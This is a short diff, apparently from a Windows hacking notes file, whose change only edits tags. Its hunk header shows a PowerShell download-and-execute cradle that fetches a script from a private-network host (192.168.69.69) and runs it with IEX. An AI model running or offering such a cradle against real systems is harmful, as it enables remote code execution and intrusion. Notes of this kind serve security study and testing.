@@ -11,4 +11,4 @@ IEX(New-Object Net.WebClient).downloadString('http://192.168.69.69/script.ps1')
 
 Tags:
 
-    #assorted #hacking #windows #windows
+    #hacking #windows #windows 
